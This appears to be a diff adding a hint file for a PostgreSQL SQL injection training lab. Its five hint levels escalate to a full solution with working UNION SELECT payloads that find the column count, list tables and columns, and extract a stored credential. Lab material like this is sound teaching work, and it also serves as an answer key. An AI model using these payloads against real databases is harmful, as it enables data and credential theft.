@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-18-union-pg",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "This is PostgreSQL, not MySQL. The injection techniques are similar, but the system tables are different. PostgreSQL has its own catalog system."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "PostgreSQL uses information_schema.tables (like MySQL) and also pg_catalog.pg_tables. You need to find user tables in the current schema (public) to locate the hidden flag table."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "Find column count with ORDER BY. Then enumerate tables: ' UNION SELECT tablename,NULL,NULL,NULL FROM pg_catalog.pg_tables WHERE schemaname='public'-- Look for a table that doesn't belong to the normal app."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "The query has 4 columns. Find tables: ' UNION SELECT tablename,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public'-- finds 'hidden_credentials'. Then: ' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='hidden_credentials'-- finds columns. Extract the flag from the right column."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "1) Find column count: ' ORDER BY 4-- works, ' ORDER BY 5-- fails. 2) Find tables: ' UNION SELECT tablename,NULL,NULL,NULL FROM pg_tables WHERE schemaname='public'-- reveals 'hidden_credentials'. 3) Find columns: ' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='hidden_credentials'-- shows 'credential'. 4) Extract: ' UNION SELECT credential,NULL,NULL,NULL FROM hidden_credentials-- displays the flag. Note: PostgreSQL requires matching types for UNION, so NULL is used for non-text columns."
+    }
+  ]
+}
